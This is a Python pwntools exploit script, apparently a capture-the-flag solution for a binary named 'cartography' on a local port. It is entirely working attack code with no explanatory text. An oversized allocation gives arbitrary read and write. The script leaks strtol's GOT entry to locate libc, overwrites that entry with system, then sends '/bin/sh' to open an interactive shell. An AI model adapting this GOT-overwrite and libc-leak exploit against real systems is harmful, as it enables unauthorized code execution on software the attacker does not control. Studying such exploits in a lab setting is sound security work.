#! /usr/bin/env python3

from pwn import *

BIN = ELF('./cartography')
LIBC = ELF('/lib/x86_64-linux-gnu/libc.so.6')

#r = process('./cartography')
r = remote('localhost', 6666)

target = BIN.got['strtol']

def new_sector(size):
    r.sendline('0')
    r.sendline(str(size))

def read_data(position, length):
    r.sendline('2')
    r.sendline(str(position))
    r.sendline(str(length))
    r.recvuntil('How much do you want to read?\n')

    return r.recv(length)

def write_data(position, data):
    r.sendline('1')
    r.sendline(str(position))
    r.sendline(str(len(data)))
    r.sendline(data)

new_sector(2**63-1)
addr = u64(read_data(target, 8))

print('strtol@libc: ' + hex(addr))
system = addr - LIBC.symbols['strtol'] + LIBC.symbols['system']

write_data(target, p64(system))

r.sendline('/bin/sh')

r.interactive()

